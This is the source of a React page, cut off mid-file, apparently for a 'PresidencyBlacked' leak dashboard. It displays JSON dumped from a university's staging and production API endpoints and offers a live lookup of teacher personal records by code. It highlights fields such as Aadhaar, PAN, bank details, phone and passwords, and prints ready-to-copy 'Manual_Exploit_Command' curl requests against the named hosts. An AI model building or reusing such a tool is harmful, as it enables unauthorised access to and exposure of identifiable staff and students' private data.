"use client";

import { useState, useMemo } from 'react';
import dvs1DataRaw from './leak_report.json';
import coeDataRaw from './coe_audit_pubapi_results.json';

interface LeakItem {
  action: string;
  status: string;
  response?: any;
  error?: string;
  raw?: string;
  data?: any;
}

const dvs1Data = dvs1DataRaw as LeakItem[];
const coeData = coeDataRaw as LeakItem[];

const SHREK_ASCII = `⡴⠑⡄⠀⠀⠀⠀⠀⠀⠀ ⣀⣀⣤⣤⣤⣀⡀
⠸⡇⠀⠿⡀⠀⠀⠀⣀⡴⢿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
⠀⠀⠀⠀⠑⢄⣠⠾⠁⣀⣄⡈⠙⣿⣿⣿⣿⣿⣿⣿⣿⣆
⠀⠀⠀⠀⢀⡀⠁⠀⠀⠈⠙⠛⠂⠈⣿⣿⣿⣿⣿⠿⡿⢿⣆
⠀⠀⠀⢀⡾⣁⣀⠀⠴⠂⠙⣗⡀⠀⢻⣿⣿⠭⢤⣴⣦⣤⣹⠀⠀⠀⢀⢴⣶⣆
⠀⠀⢀⣾⣿⣿⣿⣷⣮⣽⣾⣿⣥⣴⣿⣿⡿⢂⠔⢚⡿⢿⣿⣦⣴⣾⠸⣼⡿
⠀⢀⡞⠁⠙⠻⠿⠟⠉⠀⠛⢹⣿⣿⣿⣿⣿⣌⢤⣼⣿⣾⣿⡟⠉
⠀⣾⣷⣶⠇⠀⠀⣤⣄⣀⡀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇
⠀⠉⠈⠉⠀⠀⢦⡈⢻⣿⣿⣿⣶⣶⣶⣶⣤⣽⡹⣿⣿⣿⣿⡇
⠀⠀⠀⠀⠀⠀⠀⠉⠲⣽⡻⢿⣿⣿⣿⣿⣿⣿⣷⣜⣿⣿⣿⡇
⠀⠀ ⠀⠀⠀⠀⠀⢸⣿⣿⣷⣶⣮⣭⣽⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⣀⣀⣈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇
⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃`;

const RIGHT_ASCII = `⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡿⠳⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡶⠶⢖⠦⣄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣷⡀⠀⠀⠀⠀⠀⠐⠋⠉⠉⠛⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠟⠁⠀⠀⢀⠇⠈⢳⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡿⠋⠀⠀⠀⢀⣀⣠⠤⠤⠤⠤⠤⠤⠤⢌⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢻⠀⠀⠀⠀⠈⠀⠀⢸⠇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⣠⠤⠒⣋⡭⠤⠒⠒⠉⠉⡩⢟⣣⣤⣀⡢⣬⣉⠒⠤⣄⠀⠀⠀⠀⠀⠀⠀⠀⢼⠈⠃⠀⠀⠀⠀⠀⠀⡞⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠖⣉⠴⠒⠉⠀⠀⠀⠀⠀⢀⣞⣴⠟⠋⠉⠛⢿⣾⣎⠑⢤⡀⠙⠢⣄⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⣸⠃⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⢋⡤⢊⣁⡀⠀⠀⠀⠀⠀⠀⠀⣞⣾⠃⠀⠀⠀⠀⠀⠹⣿⡄⠀⠱⡄⠀⠈⠑⣄⠀⠀⢀⣠⣽⠶⠶⠶⠒⠒⠒⠛⢤⣄⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⡴⢋⢔⣭⣴⣿⣷⣤⠀⠀⠀⠀⠰⣽⠃⠀⠀⠀⠀⠀⠀⠀⢹⣇⠀⠀⠘⡄⠀⠀⠈⢳⣶⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠯⠻⣦⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡜⢡⠎⢠⢯⣿⠋⠁⠀⠈⠻⣷⠀⠀⠀⠀⡏⠀⠀⠀⠐⢷⢶⣄⠀⠀⣿⠀⠀⠐⠁⠀⠀⢰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠪⠙⣆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⢠⠃⠀⣮⡿⠁⠀⠀⠀⠀⠀⠻⣇⠀⠀⢸⡇⠀⠀⢀⠀⣸⣷⣻⡄⠀⣿⠀⠀⠀⠀⠀⠀⣏⠓⠒⢀⣀⣀⣀⣀⣀⣀⣀⣀⠀⢠⠖⠀⠀⠀⠘⡄
⠀⠀⣀⣠⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⢀⠇⠀⢰⣿⠇⠀⠀⠀⠀⠶⣶⡄⢹⠀⠀⠀⡇⠀⠀⣾⢹⣿⣿⣏⡇⠀⣿⠀⠀⣀⣤⡤⠤⣼⣶⠿⠛⠉⠀⠀⠀⠀⠀⠀⠉⠙⡇⠀⠀⠀⠀⠀⠀
⣠⢾⠋⠀⠀⠈⠻⡷⣄⠀⠀⠀⠀⠀⠀⢰⠁⠸⠀⠀⠸⣿⠀⠀⠀⠀⣄⣀⣷⣽⣸⠀⠀⠀⣇⠀⠀⠸⣞⣿⣅⣽⠁⢀⣇⣴⠞⠋⠁⠀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠀
⡇⠘⠂⠀⠀⠀⠀⠁⠘⡆⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⢰⣿⠀⠀⠀⠀⣇⣿⣿⣿⣿⠀⠀⠀⠸⡄⠀⠀⠙⠧⠽⠃⠀⡼⠋⠀⠀⠀⠀⠀⣯⠦⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀
⢳⡀⠀⠀⠀⠀⠀⠀⢀⣹⣤⣤⣤⣤⣄⡇⠀⠰⠀⠀⠀⣿⠀⠀⠀⠀⢻⡽⠿⣾⢹⠀⠀⠀⠀⠻⡄⠀⠀⠀⠀⢠⠞⠁⠀⣀⣀⡀⠀⠀⠘⢧⡀⣠⣤⡶⠖⠛⠛⠛⠒⠒⡞⠀⠀⠀⠀⠀⠀⢀⠀
⠀⠉⠳⣄⠀⢀⡤⡺⠛⠉⠀⠀⠀⠀⠈⣻⢦⠀⠀⠀⠀⢻⡆⠀⠀⠀⠈⠻⠟⢁⡎⠀⠀⠀⠀⠀⠙⠦⣄⣀⣤⠟⠀⠀⠉⣀⣀⣀⡉⠂⠀⠀⣽⣏⠁⠀⠀⠀⠀⠀⠀⠀⢇⠀⠀⠀⠀⠀⢠⡞⠀
⠀⠀⠀⢈⣷⠋⠀⠁⠀⠀⠀⠀⠀⢈⣩⣤⣼⣧⣤⡀⠀⠀⠻⡄⠀⠀⠀⠀⢀⡼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠋⠀⠀⣈⣭⠵⠒⠋⠉⠂⠀⠀⠹⡌⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠋⠀⠀
⠀⠀⠀⣾⠋⠀⠀⠀⠀⠀⢀⡤⠞⠉⠉⠀⠀⠀⠈⣻⡆⠀⣀⣙⡦⠤⣀⣤⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠋⣡⡏⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⣄⡀⠀⠀⠀⠀⠀⠀⣀⣠⠴⠋⠁⠀⠀⠀
⠀⠀⠀ge⠋⠀⠀⠀⠀⢀⡶⠉⠀⠀⠀⠀⠀⠀⠀⠈⠁⡧⠋⠉⠁⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠚⠉⠀⢀⣴⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⠈⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣾⠋⠀⠀⠀⠀⠀⢀⡶⠉⠀⠀⠀⠀⠀⠀⠀⠈⠁⡧⠋⠉⠁⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠚⠉⠀⢀⣴⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⠈⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⠇⠀⠀⠀⠀⢀⡶⠉⠀⠀⠀⠀⠀⠀⠀⠈⠁⡧⠋⠉⠁⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⢀⣠⠴⠚⠉⠀⢀⣴⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠁⠈⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⠀⠀⠀⠉⠑⢏⠀⠀⠀⠀⠀⠀⣀⣤⠶⠶⠾⣧⡀⠀⠀⠀⠀⠀⣤⣤⣤⣤⡤⠒⠒⠉⠁⠀⠀⣀⣤⣶⠿⢿⡿⠀⠀⠀⠀⠀⠀⠀⠀⢀⡶⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⡆⠀⠀⠀⠀⠈⠇⠀⠀⢀⡤⠚⠉⠀⠀⠀⠐⠁⡇⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣶⣶⣶⣶⣾⠿⣿⡟⠁⠀⣼⠃⠀⠀⠀⠀⠀⣠➶⣠⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⡄⠀⠀⠀⠀⠀⠀⠉⠻⡄⠀⠀⠀⠀⠀⠀⣰⠁⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⠃⣠⠏⠀⠀⣰⠏⠀⠀⠀⠀⠠⠞⢁⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠊⠀⠀⠀⠀⢀⡴⠋⠳⢄⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⠁⠊⠀⠀⢀⡰⠋⠀⠀⠀⠀⠀⣠⡴⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠑⠦⣀⡀⠀⠀⠀⠀⠀⣀⡠⠖⠋⠀⠀⠀⠀⠙⠢⢄⡀⠀⠀⠀⠀⠈⠛⢿⣇⣀⣀⣠⠴⠋⠀⠀⠀⢀⣀⠤⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠒⠒⠚⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠒⠤⢤⣀⣀⣀⣀⣀⣀⣀⣀⡠⠤⠖⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`;

export default function Home() {
  const [loading, setLoading] = useState(false);
  const [data, setData] = useState<any | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [activeVector, setActiveVector] = useState('getteachperinfo');
  const [params, setParams] = useState<{[key: string]: string}>({ fteachcode: '' });
  const [archiveSearch, setArchiveSearch] = useState('');
  const [showMascots, setShowMascots] = useState(false);
  const [userRegNo, setUserRegNo] = useState('20241BCI0249');
  const [environment, setEnvironment] = useState<'DVS1' | 'COE'>('DVS1');

  const leakData = environment === 'DVS1' ? dvs1Data : coeData;

  const formatLabel = (key: string) => {
    let label = key.startsWith('f') ? key.substring(1) : key;
    return label
      .replace(/([A-Z])/g, ' $1')
      .replace(/_/g, ' ')
      .replace(/^./, str => str.toUpperCase())
      .trim();
  };

  const isSensitive = (key: string) => {
    const lowKey = key.toLowerCase();
    return lowKey.includes('email') || 
           lowKey.includes('mobile') || 
           lowKey.includes('phone') || 
           lowKey.includes('dob') || 
           lowKey.includes('pan') || 
           lowKey.includes('aadhar') ||
           lowKey.includes('bank') ||
           lowKey.includes('ifsc') ||
           lowKey.includes('accno') ||
           lowKey.includes('address') ||
           lowKey.includes('pass');
  };

  const handleSearch = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    setError(null);
    setData(null);

    try {
      const queryParams = new URLSearchParams({ action: activeVector, ...params });
      const res = await fetch(`/api/teacher?${queryParams.toString()}`);
      const result = await res.json();

      if (result.status === 'success' || result.data) {
        const displayData = result.data?.data || result.data || result;
        setData(displayData);
      } else {
        setError(result.error || 'No records found for this vector.');
      }
    } catch (err) {
      setError('Failed to query the Transparency Tool. Connection refused.');
    } finally {
      setLoading(false);
    }
  };

  const handlePubApiQuery = async (action: string, customParams: {[key: string]: string} = {}) => {
    setLoading(true);
    setError(null);
    setData(null);
    setActiveVector(action);

    try {
      const queryParams = new URLSearchParams({ a: action, ...customParams });
      const res = await fetch(`/api/pubapi?${queryParams.toString()}`);
      const result = await res.json();

      if (result) {
        setData(result);
      } else {
        setError('No records found for this vector.');
      }
    } catch (err) {
      setError('Failed to query the PubAPI Tool. Connection refused.');
    } finally {
      setLoading(false);
    }
  };
   const handleVectorClick = (id: string) => {
    setActiveVector(id);
    setError(null);
    
    if (id === 'getteachperinfo') {
      setData(null);
      setParams({ fteachcode: '' });
    } else {
      // Find the exact item in the leak report
      const item = leakData.find(d => d.action === id);
      if (item) {
        // Store the entire item to show exact leak report output
        setData(item);
      } else {
        setData(null);
        setError(`No cached data for ${id}`);
      }
    }
  };

  const getVectorStatus = (item: any) => {
    if (item.status === 'RESTRICTED') return 'RESTRICTED';
    if (item.status === 'FAILURE') return 'FAILURE';
    if (item.response?.status === 'failure' || item.response?.error_code === -1) return 'FAILURE';
    if (item.data?.status === 'Failure' || item.data?.status === 'failure' || item.data?.error_code === -1) return 'FAILURE';
    return 'SUCCESS';
  };

  const filteredVectors = useMemo(() => {
    const filtered = leakData.filter(item => 
      item.action.toLowerCase().includes(archiveSearch.toLowerCase())
    );
    // Sort: SUCCESS (1) -> RESTRICTED (2) -> FAILURE (3)
    return filtered.sort((a, b) => {
      const order = { SUCCESS: 1, RESTRICTED: 2, FAILURE: 3 };
      return order[getVectorStatus(a)] - order[getVectorStatus(b)];
    });
  }, [archiveSearch, leakData]);

  const counts = useMemo(() => {
    return leakData.reduce((acc, item) => {
      const status = getVectorStatus(item);
      acc[status] = (acc[status] || 0) + 1;
      return acc;
    }, { SUCCESS: 0, RESTRICTED: 0, FAILURE: 0 });
  }, [leakData]);

  const getVectorColors = (status: string, isActive: boolean) => {
    if (isActive) {
      if (status === 'SUCCESS') return 'bg-[#00ff00] text-black border-[#00ff00] shadow-[0_0_15px_rgba(0,255,0,0.3)]';
      if (status === 'RESTRICTED') return 'bg-orange-500 text-black border-orange-500 shadow-[0_0_15px_rgba(249,115,22,0.3)]';
      if (status === 'FAILURE') return 'bg-[#ff4d4d] text-black border-[#ff4d4d] shadow-[0_0_15px_rgba(255,77,77,0.3)]';
    } else {
      if (status === 'SUCCESS') return 'bg-transparent text-[#00ff00]/60 border-[#00ff00]/20 hover:border-[#00ff00] hover:text-[#00ff00]';
      if (status === 'RESTRICTED') return 'bg-transparent text-orange-500/80 border-orange-500/40 hover:border-orange-500 hover:text-orange-500';
      if (status === 'FAILURE') return 'bg-transparent text-[#ff4d4d]/80 border-[#ff4d4d]/40 hover:border-[#ff4d4d] hover:text-[#ff4d4d]';
    }
    return 'bg-transparent text-white/40 border-white/10';
  };

  return (
    <main className="min-h-screen flex flex-col items-center p-8 md:p-24 bg-black text-white selection:bg-[#ff4d4d] relative overflow-x-hidden">
      {/* Header */}
      <header className="w-full max-w-5xl mb-12 relative flex justify-center items-center animate-in fade-in duration-1000">
        {/* ASCII Shrek Logo */}
        <pre className={`absolute -left-16 xl:-left-40 top-1/2 -translate-y-1/2 text-[10px] text-[#00ff00] font-mono leading-none transition-all duration-700 cursor-help text-left drop-shadow-[0_0_5px_rgba(0,255,0,0.2)] hover:drop-shadow-[0_0_25px_rgba(0,255,0,1)] z-20 ${showMascots ? 'opacity-100 scale-100 pointer-events-auto' : 'opacity-0 scale-95 pointer-events-none'}`}>
          {SHREK_ASCII}
        </pre>

        {/* ASCII Pepe Logo */}
        <pre className={`absolute -right-32 xl:-right-64 top-1/2 -translate-y-1/2 text-[6px] text-[#00ff00] font-mono leading-none transition-all duration-700 cursor-help text-left drop-shadow-[0_0_5px_rgba(0,255,0,0.2)] hover:drop-shadow-[0_0_25px_rgba(0,255,0,1)] z-20 ${showMascots ? 'opacity-100 scale-100 pointer-events-auto' : 'opacity-0 scale-95 pointer-events-none'}`}>
          {RIGHT_ASCII}
        </pre>
        
        <div className="text-center z-10">
          <h1 className="text-5xl md:text-8xl font-black tracking-tighter mb-4 italic">
            Presidency<span className="text-white/60">Blacked</span>
          </h1>
          <p className="text-[#ff4d4d] font-mono text-xs uppercase tracking-[0.5em] bg-white/10 inline-block px-4 py-1 rounded-full border border-[#ff4d4d]/50 animate-pulse shadow-[0_0_15px_rgba(255,77,77,0.3)]">
            not every system is secure
          </p>
        </div>
      </header>

      {/* Environment Toggle */}
      <div className="w-full max-w-6xl mb-8 flex flex-col items-center animate-in fade-in slide-in-from-bottom-4 duration-500 z-50">
        <div className="flex bg-white/5 border border-white/10 p-1 rounded-full relative shadow-lg mb-4">
          <button
            onClick={() => { setEnvironment('DVS1'); setActiveVector(''); setData(null); setError(null); }}
            className={`px-8 py-3 rounded-full font-black text-sm uppercase tracking-widest transition-all duration-300 z-10 ${
              environment === 'DVS1' 
                ? 'bg-[#00ff00] text-black shadow-[0_0_20px_rgba(0,255,0,0.4)]' 
                : 'text-white/60 hover:text-white'
            }`}
          >
            [STAGING: DVS1] ({dvs1Data.length})
          </button>
          <button
            onClick={() => { setEnvironment('COE'); setActiveVector(''); setData(null); setError(null); }}
            className={`px-8 py-3 rounded-full font-black text-sm uppercase tracking-widest transition-all duration-300 z-10 ${
              environment === 'COE' 
                ? 'bg-[#ff4d4d] text-black shadow-[0_0_20px_rgba(255,77,77,0.4)]' 
                : 'text-white/60 hover:text-white'
            }`}
          >
            [PRODUCTION: COE] ({coeData.length})
          </button>
        </div>

        {/* Environment Link */}
        <a 
          href={environment === 'DVS1' ? 'https://dvs1.pgi-intraconnect.in/tdvs-php/app.php' : 'https://coe.pgi-intraconnect.in/pubapi/app.php'} 
          target="_blank" 
          rel="noreferrer"
          className={`font-mono text-[10px] tracking-widest px-4 py-1.5 rounded-full border flex items-center gap-2 transition-all ${
            environment === 'DVS1' 
              ? 'text-[#00ff00]/60 hover:text-[#00ff00] bg-[#00ff00]/5 border-[#00ff00]/20 shadow-[0_0_10px_rgba(0,255,0,0.1)]' 
              : 'text-[#ff4d4d]/60 hover:text-[#ff4d4d] bg-[#ff4d4d]/5 border-[#ff4d4d]/20 shadow-[0_0_10px_rgba(255,77,77,0.1)]'
          }`}
        >
          <span className={`w-2 h-2 rounded-full animate-pulse ${environment === 'DVS1' ? 'bg-[#00ff00]' : 'bg-[#ff4d4d]'}`}></span>
          TARGET_ENDPOINT: {environment === 'DVS1' ? 'https://dvs1.pgi-intraconnect.in/tdvs-php/app.php' : 'https://coe.pgi-intraconnect.in/pubapi/app.php'}
        </a>
      </div>

      {/* Vector Selector - Searchable & Scrollable */}
      <div className="w-full max-w-6xl mb-12 animate-in fade-in slide-in-from-bottom-4 duration-700">
        <div className="flex items-center justify-between mb-4 px-2">
          <span className="font-mono text-[10px] text-white/70 tracking-widest uppercase">Target Vector Selection (TOTAL FUNCTIONS LEAKED: {leakData.length})</span>
          <div className="flex gap-4">
            <span className="font-mono text-[10px] text-[#00ff00] tracking-widest">[OPEN: {counts.SUCCESS}]</span>
            <span className="font-mono text-[10px] text-orange-500 tracking-widest">[RESTRICTED: {counts.RESTRICTED}]</span>
            <span className="font-mono text-[10px] text-[#ff4d4d] tracking-widest">[FAILED: {counts.FAILURE}]</span>
          </div>
        </div>
        
        <input 
          type="text"
          placeholder={`SEARCH ${leakData.length} LEAKED FUNCTIONS (e.g., 'scheme', 'bill', 'room')...`}
          className="w-full bg-white/10 border border-white/20 p-4 rounded-xl font-mono text-xs tracking-widest focus:border-[#ff4d4d] focus:outline-none transition-all mb-4"
          value={archiveSearch}
          onChange={(e) => setArchiveSearch(e.target.value)}
        />

        <div className="flex flex-wrap gap-3 h-[400px] overflow-y-auto p-6 border border-white/15 rounded-xl bg-white/[0.05] custom-scrollbar content-start">
          {/* Always keep Live Oracle at the top if no search, or if it matches */}
          {('teacher profile getteachperinfo'.includes(archiveSearch.toLowerCase())) && (
            <button
              onClick={() => handleVectorClick('getteachperinfo')}
              className={`px-6 py-3 font-mono text-xs uppercase tracking-widest rounded-md border transition-all duration-300 ${
                activeVector === 'getteachperinfo' 
                  ? 'bg-[#00ff00] text-black border-[#00ff00] shadow-[0_0_15px_rgba(0,255,0,0.3)]' 
                  : 'bg-transparent text-[#00ff00]/80 border-[#00ff00]/40 hover:border-[#00ff00] hover:text-[#00ff00]'
              }`}
            >
              [LIVE] Teacher Profile
            </button>
          )}

          {filteredVectors.map((v, idx) => {
            const status = getVectorStatus(v);
            const isActive = activeVector === v.action;
            return (
              <button
                key={`${v.action}-${idx}`}
                onClick={() => handleVectorClick(v.action)}
                className={`px-6 py-3 font-mono text-xs uppercase tracking-widest rounded-md border transition-all duration-300 flex items-center gap-2 ${getVectorColors(status, isActive)}`}
              >
                {v.action}
              </button>
            );
          })}
        </div>
      </div>

      {/* Live Input Section (Only for Teacher Profile) */}
      {activeVector === 'getteachperinfo' && (
        <div className="w-full max-w-5xl mb-12 animate-in fade-in slide-in-from-bottom-4 duration-500">
          <form onSubmit={handleSearch} className="flex flex-col gap-4">
            <input
              type="text"
              className="glowing-input text-center text-xl uppercase tracking-[0.2em]"
              placeholder="ENTER CODE (e.g. PUNIV02237, 20233CSE0025, EXTERNALPHD0003)"
              value={params.fteachcode || ''}
              onChange={(e) => setParams({ fteachcode: e.target.value })}
            />
            <button 
              type="submit" 
              className="glowing-button text-lg uppercase tracking-[0.3em] font-black self-center px-12 max-w-md w-full"
              disabled={loading}
            >
              {loading ? 'BREACHING DATABASE...' : 'initiate query'}
            </button>
          </form>
        </div>
      )}

      {/* Error Message */}
      {error && (
        <p className="text-[#ff4d4d] text-center mb-12 font-mono text-lg animate-pulse uppercase font-black">
          [ACCESS_DENIED]: {error}
        </p>
      )}

      {/* Data Dashboard */}
      {data && (
        <div className="w-full max-w-6xl flex flex-col gap-8 mb-12 animate-in fade-in zoom-in-95 duration-1000">
          
          {/* Render Premium Profile for Live Oracle */}
          {activeVector === 'getteachperinfo' ? (
            <div className="glass-panel p-10 md:p-16 relative overflow-hidden">
              <div className="absolute top-0 left-0 w-2 h-full bg-[#00ff00] opacity-50 shadow-[0_0_20px_#00ff00]"></div>
              <div className="flex flex-col md:flex-row justify-between items-start md:items-end gap-10">
                <div className="flex-1">
                  <span className="label text-xs font-bold tracking-[0.3em] opacity-50 mb-4 block">FILE_IDENTITY_RECOVERED</span>
                  <h2 className="text-4xl md:text-7xl font-black tracking-tighter uppercase leading-none">
                    {data.fteachname || 'UNKNOWN'}
                  </h2>
                  <div className="flex flex-wrap gap-6 items-center mt-8">
                    <div className="bg-white/15 px-4 py-2 rounded-lg border border-white/20">
                      <span className="text-[10px] block opacity-60 font-mono mb-1">FACULTY_ID</span>
                      <span className="font-mono text-xl tracking-widest font-bold">{data.fteachcode}</span>
                    </div>
                    {data.fdesignation && (
                      <div className="bg-[#00ff00]/10 px-4 py-2 rounded-lg border border-[#00ff00]/20">
                        <span className="text-[10px] block opacity-60 font-mono mb-1 text-[#00ff00]">CLEARANCE_LVL</span>
                        <span className="text-xl font-bold text-[#00ff00] uppercase tracking-tighter">{data.fdesignation}</span>
                      </div>
                    )}
                  </div>
                </div>
                
                <div className="text-left md:text-right flex flex-col gap-2 max-w-sm">
                  <span className="label text-[10px] opacity-50">HOST_ORGANIZATION</span>
                  <div className="text-2xl md:text-3xl font-bold tracking-tight text-white leading-tight">
                    {data.funivname || 'UNSPECIFIED'}
                  </div>
                  {data.fcollname && (
                    <div className="text-base text-white/60 font-mono mt-2 italic border-l-2 md:border-l-0 md:border-r-2 border-white/15 px-4">
                      {data.fcollname}
                    </div>
                  )}
                </div>
              </div>
            </div>
          ) : (
            /* EXACT LEAK REPORT RAW OUTPUT */
            <div className="glass-panel p-6 relative overflow-hidden bg-black border-[#ff4d4d]/60">
              <div className="absolute top-0 left-0 w-2 h-full bg-[#ff4d4d] opacity-100 shadow-[0_0_20px_#ff4d4d]"></div>
              <div className="flex items-center justify-between mb-4 pl-4 border-b border-white/20 pb-4">
                <h2 className="text-lg font-black uppercase tracking-widest text-[#ff4d4d]">
                  RAW_LEAK_OUTPUT: {activeVector}
                </h2>
                <div className="flex items-center gap-4">
                  <a 
                    href={environment === 'DVS1' 
                      ? `https://dvs1.pgi-intraconnect.in/tdvs-php/app.php?a=${activeVector}&univcode=064` 
                      : `https://coe.pgi-intraconnect.in/pubapi/app.php?a=${activeVector}&univcode=064`}
                    target="_blank"
                    rel="noreferrer"
                    className="font-mono text-[10px] bg-[#ff4d4d]/10 text-[#ff4d4d] border border-[#ff4d4d]/30 px-3 py-1 rounded hover:bg-[#ff4d4d] hover:text-black transition-colors flex items-center gap-2 tracking-widest"
                  >
                    <span className="w-1.5 h-1.5 bg-current rounded-full animate-pulse"></span>
                    TEST LIVE URL
                  </a>
                  <span className="text-[10px] font-mono text-white/60">JSON_DUMP</span>
                </div>
              </div>
              
              <div className="flex flex-col mb-4 bg-[#ff4d4d]/5 border border-[#ff4d4d]/20 rounded-lg p-4 mx-4">
                <span className="text-[10px] text-[#ff4d4d] font-mono mb-2 uppercase tracking-widest font-bold">Manual_Exploit_Command:</span>
                <code className="text-[10px] text-[#00ff00]/70 font-mono break-all select-all block bg-black p-3 rounded border border-white/5">
                  {environment === 'COE' 
                    ? `curl -X POST "https://coe.pgi-intraconnect.in/pubapi/app.php?a=${activeVector}&univcode=064" \\\n  -H "Authorization: Bearer <ADMIN_JWT_TOKEN>" \\\n  -H "Content-Type: application/json" \\\n  -d '[{"regno": "20251BAE0001", "subject": "PSY1001", "school": "SCHOOL OF LIBERAL ARTS AND SCIENCES", "term": "S1", "programLevel": "UG", "batchStartYear": "2025", "assessmentType": "3. End-Term Exam", "assessmentInstance": "End-Term Exam"}]'`
                    : `curl -X GET "https://dvs1.pgi-intraconnect.in/tdvs-php/app.php?a=${activeVector}&univcode=064&fteachcode=1&fbarcode=1&fmobile=9876543210&fyear=2024"`
                  }
                </code>
              </div>

              <pre className="text-xs font-mono text-[#00ff00] overflow-x-auto whitespace-pre-wrap p-4 mx-4 mb-4 bg-white/[0.02] rounded-lg border border-white/5">
                {JSON.stringify(data, null, 2)}
              </pre>
            </div>
          )}

          {/* Render Extra Data Grid ONLY for Live Oracle */}
          {activeVector === 'getteachperinfo' && (
            <div className="grid grid-cols-1 gap-10">
              <div className="glass-panel p-10">
                <div className="flex items-center justify-between mb-10 border-b border-white/20 pb-6">
                  <div className="flex items-center gap-4">
                    <div className="w-3 h-3 rounded-full bg-[#00ff00] animate-pulse shadow-[0_0_10px_#00ff00]"></div>
                    <h3 className="text-sm font-black uppercase tracking-[0.4em]">Extracted Intelligence</h3>
                  </div>
                  <span className="text-[10px] font-mono text-white/60">STATUS: SUCCESSFUL</span>
                </div>
                
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-y-10 gap-x-16">
                  {Object.entries(data)
                    .map(([key, value]) => {
                      const sensitive = isSensitive(key);
                      const displayValue = (value === null || value === undefined || value === '') 
                        ? 'NULL' 
                        : typeof value === 'object' ? JSON.stringify(value) : String(value);

                      return (
